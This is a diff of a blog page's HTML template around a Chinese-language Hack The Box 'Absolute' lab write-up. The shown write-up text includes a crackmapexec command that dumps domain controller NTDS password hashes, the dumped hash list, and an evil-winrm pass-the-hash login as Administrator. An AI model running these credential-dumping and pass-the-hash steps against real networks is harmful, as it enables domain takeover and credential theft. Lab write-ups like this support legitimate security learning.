@@ -1,13 +1,179 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="referrer" content="no-referrer"><meta name="google-site-verification" content="YKwcqblwsZCg-ylX8b6YPzjmkIRadB3nD8IU3XMN6gg"><title>HTB Absolute Writeup By Boogipop | Boogiepop Doesn't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.ttf");
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Doesn't Laugh" type="application/atom+xml">
-</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>HTB Absolute Writeup By Boogipop</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-14T14:44:41.614Z" id="date"> 2023-04-14</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-04-14T14:45:40.623Z" id="updated"> 2023-04-14</time></div></span></div></div><hr><div id="post-content"><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482153091-87197ac3-2f8c-4d02-b80b-4080afac1598.png#averageHue=%231a2331&clientId=u508f3206-e774-4&from=paste&height=731&id=ue5b0b1d0&name=image.png&originHeight=914&originWidth=1303&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=281208&status=done&style=none&taskId=u80ba8081-c673-4856-9f18-a1b28a64434&title=&width=1042.4" alt="image.png"><br>Insane！</p>
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>HTB Absolute Writeup By Boogipop - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="HTB Absolute Writeup By Boogipop - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/04/14/Absolute%20Writeup%20By%20Boogipop/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-04-14T14:44:41.614Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/HackTheBox/">HackTheBox</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>April</span>
+            <span>14,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">HTB Absolute Writeup By Boogipop</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482153091-87197ac3-2f8c-4d02-b80b-4080afac1598.png#averageHue=%231a2331&clientId=u508f3206-e774-4&from=paste&height=731&id=ue5b0b1d0&name=image.png&originHeight=914&originWidth=1303&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=281208&status=done&style=none&taskId=u80ba8081-c673-4856-9f18-a1b28a64434&title=&width=1042.4" alt="image.png"><br>Insane！</p>
 <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
 <li>Misc杂项</li>
 <li>TGT黄金票据伪造</li>
@@ -93,22 +259,149 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└─# crackmapexec smb -dc-ip dc.absolute.htb -u &#x27;DC$&#x27; -H A7864AB463177ACB9AEC553F18F42577 --ntds</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:c-ip) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [+] c-ip\DC$:A7864AB463177ACB9AEC553F18F42577</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...</span><br><span class="line">SMB         dc.absolute.htb 445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::</span><br><span class="line">SMB         dc.absolute.htb 445    DC               [+] Dumped 18 NTDS hashes to /root/.cme/logs/DC_dc.absolute.htb_2023-04-15_051536.ntds of which 17 were added to the database</span><br></pre></td></tr></table></figure>
 <p><code> evil-winrm -i absolute.htb -u &quot;Administrator&quot; -H 1f4a6093623653f6488d5aa24c75f2ea</code><br>结束了家人们<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482165606-9d5939d4-ab02-43c1-ad33-bcc82c8253eb.png#averageHue=%232e2d26&clientId=u508f3206-e774-4&from=paste&height=141&id=u10870119&name=image.png&originHeight=176&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=263240&status=done&style=none&taskId=udd6ad99d-7f4a-4bac-bca2-2e3602df958&title=&width=850.4" alt="image.png"></p>
 <h1 id="结尾（关于HacktheBox的小trick"><a href="#结尾（关于HacktheBox的小trick" class="headerlink" title="结尾（关于HacktheBox的小trick)"></a>结尾（关于HacktheBox的小trick)</h1><p>之前打Htb一直都是用kali去连接openvpn，本来是想过用windows连的，但因为第一次用的openvpn可能版本不对劲，所以当时认为不行，然后这一次我下载了最新版发现肯定是可以的啊，之前的自己铸币了<br>所以以后打hackthebox，只需要windows连接openvpn即可，由于是NAT桥接模式kali是可以直接访问靶机的，一举两得~<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681483387597-4cead0db-cc87-447c-8caf-df748a38f6cc.png#averageHue=%23e1e0de&clientId=u508f3206-e774-4&from=paste&height=335&id=u77e7f8e1&name=image.png&originHeight=419&originWidth=783&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48082&status=done&style=none&taskId=u7bfded6c-2e3f-4f32-8dee-0e872201aa9&title=&width=626.4" alt="image.png"></p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/16/BUUCTF%20Web%20WriteUp%205/">← Next BUUCTF Web Writeup 5</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/13/%E8%AE%B0%E4%B8%80%E6%AC%A1Weblogic_cmd%E5%B0%8F%E6%94%B9/">记一次Weblogic_cmd小改 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">使用工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E7%96%91%E3%81%AEPNG"><span class="toc-number">4.</span> <span class="toc-text">可疑のPNG</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E6%94%BE%E3%81%AEKerberos%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.</span> <span class="toc-text">开放のKerberos端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMB%E5%B0%9D%E8%AF%95"><span class="toc-number">6.</span> <span class="toc-text">SMB尝试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGT%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0%EF%BC%88%E5%A4%A7%E5%9D%91%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">TGT黄金票据伪造（大坑）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A1%AB%E5%9D%91%E5%A1%AB%E5%9D%91"><span class="toc-number">8.</span> <span class="toc-text">填坑填坑</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pipenv"><span class="toc-number">8.1.</span> <span class="toc-text">pipenv</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E7%96%91%E3%81%AEexe%E6%96%87%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">可疑のexe文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0TGT%E7%A5%A8%E6%8D%AE%E4%BD%BF%E7%94%A8BloodHound%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">10.</span> <span class="toc-text">伪造TGT票据使用BloodHound信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AD%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">11.</span> <span class="toc-text">AD域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9D%91%E7%82%B9"><span class="toc-number">11.1.</span> <span class="toc-text">坑点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BC%AA%E9%80%A0TGT"><span class="toc-number">12.</span> <span class="toc-text">进一步伪造TGT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96User-txt"><span class="toc-number">13.</span> <span class="toc-text">获取User.txt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9D%91"><span class="toc-number">13.1.</span> <span class="toc-text">坑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E4%BF%AE%E5%A4%8D%E6%8F%90%E6%9D%83%EF%BC%88root-txt"><span class="toc-number">14.</span> <span class="toc-text">无修复提权（root.txt)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE%EF%BC%88%E5%85%B3%E4%BA%8EHacktheBox%E7%9A%84%E5%B0%8Ftrick"><span class="toc-number">15.</span> <span class="toc-text">结尾（关于HacktheBox的小trick)</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
- el: '#valine'
- , appId: '4KNp8mNp9RkLrDSktdFbmIO8-gzGzoHsz'
- , appKey: 'I3KhKOyWDf9eRRnVEAit98wt' , placeholder: 'This comment is sent by Penguin Logistics.'
- , path: window.location.pathname
-});code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/HackTheBox/" class="tag">#HackTheBox</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/04/16/BUUCTF%20Web%20WriteUp%205/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">BUUCTF Web Writeup 5</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/04/13/%E8%AE%B0%E4%B8%80%E6%AC%A1Weblogic_cmd%E5%B0%8F%E6%94%B9/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">记一次Weblogic_cmd小改</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
